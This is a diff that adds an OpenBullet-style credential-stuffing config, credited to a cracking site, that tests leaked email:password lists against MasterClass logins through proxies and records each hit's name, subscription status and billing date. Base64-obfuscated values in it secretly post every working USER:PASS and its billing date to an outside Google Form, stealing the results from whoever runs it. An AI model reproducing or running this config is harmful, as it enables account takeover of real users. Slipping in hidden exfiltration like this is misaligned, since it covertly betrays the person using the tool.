@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "MasterClass  @CrakingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:18:26.5342771+08:00",
+  "AdditionalInfo": " @CrakingLegend.pw",
+  "Author": " @CrakingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_Masterclass REQUEST GET "https://www.masterclass.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+#Token PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\" /><" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.masterclass.com/auth/identity/callback" 
+  CONTENT "next_page=&auth_key=<USER>&password=<PASS>&provider=identity" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "x-csrf-token: <Token>" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success" 
+  KEYCHAIN Failure OR 
+    KEY "status\":\"failed" 
+
+#Request_Masterclass REQUEST GET "https://www.masterclass.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xRVk0bkx6dDlqRzlaU1M3ZEswZklHR0VZMzYwazNFMjRKdHU3eXJFaUs3Zy92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Nama_Depan PARSE "<SOURCE>" LR "first_name&quot;:&quot;" "&quot" -> VAR "Fname" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZG9rQ05MUnJJTFEtcWpGRERNZGtpeVVNQkp4VWhZQlNmWU1MTFpWSno5ZnpYRUNBL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Nama PARSE "<SOURCE>" LR "last_name&quot;:&quot;" "&quot" -> CAP "Name" "<Fname> " "" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTgzODU2MTk5NT1NYXN0ZXJDbGFzcyZlbnRyeS4xNjA5MDQzOTE1PTxVU0VSPjo8UEFTUz4mZW50cnkuNzYwMzM1ODM3PXxOZXh0IEJpbGxpbmc6PE5leHQgQmlsbGluZz58JmZ2dj0xJmRyYWZ0UmVzcG9uc2U9JTVCbnVsbCUyQ251bGwlMkMlMjIzMjQ0ODA2NTY3OTEzNzAyNzgzJTIyJTVEJTBEJTBBJnBhZ2VIaXN0b3J5PTAmZmJ6eD0zMjQ0ODA2NTY3OTEzNzAyNzgz" -> VAR "LRU3" 
+
+#Cek_Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "expiration_date&quot;:&quot;" "T" -> CAP "Next Billing" "" " Visit us @CrakingLegend.pw" 
+
+#Perbaikan FUNCTION DateToUnixTime "yyyy-MM-dd" "<Next Billing>" -> VAR "Waktu1" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Start your first class" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Upgrade Now" 
+    KEY "<Waktu2>" GreaterThan "<Waktu1>" 
+
+#Name REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Next_Billing REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
